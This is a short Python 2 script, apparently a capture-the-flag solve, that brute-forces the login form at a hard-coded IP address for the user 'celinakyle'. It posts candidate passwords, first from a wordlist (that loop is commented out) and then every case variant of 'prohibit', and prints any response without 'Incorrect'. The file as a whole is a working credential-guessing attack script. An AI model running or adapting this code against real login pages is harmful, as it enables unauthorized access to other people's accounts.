#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-05-14 09:31:33
# @Last Modified by:   john
# @Last Modified time: 2016-05-14 11:37:52

import itertools
import requests
import re
from colorama import *

init(autoreset=True)

url = 'http://104.196.9.105:9092/login'

s = requests.Session()

get = '''<div class="col-lg-12">(.*)</div>
'''

given = '''
                <div class="col-lg-12">
                    <h1>Personal Login Portal</h1>
<form action="/login" method="post">
    <input type="text" name="username" placeholder="Username"><BR>
    <input type="password" name="password" placeholder="Password"><BR>
    <input type="submit" value="Login">
</form>
Incorrect password. Authorized users only.<br><br>
                </div>
            </div>
        </div>
    </section>

    <section id="about" class="about-section">
        <div class="container">
            
'''


passwords = open('passwords.txt')


def attempt(use):
	print Fore.MAGENTA + use
	# print use
	r = s.post(url, data={"username":"celinakyle","password":use})
	match = r.text.split('<div class="row">')[1]
	print match
	if "Incorrect" not in match:
		print Fore.GREEN + match
		raw_input()

# for password in passwords.readlines():
# 	password= password.rstrip()
# 	attempt(password)
# 	attempt(password.lower())

word = 'prohibit'
possibs = map(''.join, itertools.product(*((c.upper(), c.lower()) for c in word)))

for p in possibs:
	attempt(p)


passwords.close()